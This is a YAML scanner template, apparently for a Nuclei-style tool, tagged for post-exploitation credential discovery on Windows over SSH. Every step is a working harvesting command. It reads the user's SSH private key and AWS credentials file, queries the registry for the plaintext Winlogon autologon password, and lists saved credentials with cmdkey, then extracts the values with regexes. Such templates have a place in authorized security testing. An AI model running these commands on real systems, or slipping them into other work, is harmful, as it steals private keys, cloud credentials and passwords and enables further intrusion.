id: ssh-credential-files-windows
service: [ssh]
info:
  name: SSH Windows Credential File Discovery
  severity: high
  tags: ssh,post-exploit,credential,windows

services:
  - ops:
      - shell: "whoami 2>nul"
        name: os_check
    matchers:
      - type: word
        part: os_check
        words: ["\\"]

  - ops:
      - shell: "type %USERPROFILE%\\.ssh\\id_rsa 2>nul"
        name: ssh_key
    matchers:
      - type: word
        part: ssh_key
        words: ["PRIVATE KEY"]
    extractors:
      - type: regex
        name: key_type
        part: ssh_key
        regex: ['-----BEGIN (\S+ PRIVATE KEY)-----']
        group: 1

  - ops:
      - shell: "type %USERPROFILE%\\.aws\\credentials 2>nul"
        name: aws_creds
    matchers:
      - type: word
        part: aws_creds
        words: ["aws_access_key_id"]
    extractors:
      - type: regex
        name: aws_key
        part: aws_creds
        regex: ['aws_access_key_id\s*=\s*(\S+)']
        group: 1

  - ops:
      - shell: "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword 2>nul"
        name: autologon
    matchers:
      - type: word
        part: autologon
        words: ["DefaultPassword"]
    extractors:
      - type: regex
        name: autologon_password
        part: autologon
        regex: ['DefaultPassword\\s+REG_SZ\\s+(\\S+)']
        group: 1

  - ops:
      - shell: "cmdkey /list 2>nul"
        name: saved_creds
    matchers:
      - type: word
        part: saved_creds
        words: ["Target:"]
    extractors:
      - type: regex
        name: credential_targets
        part: saved_creds
        regex: ['Target:\\s*(\\S+)']
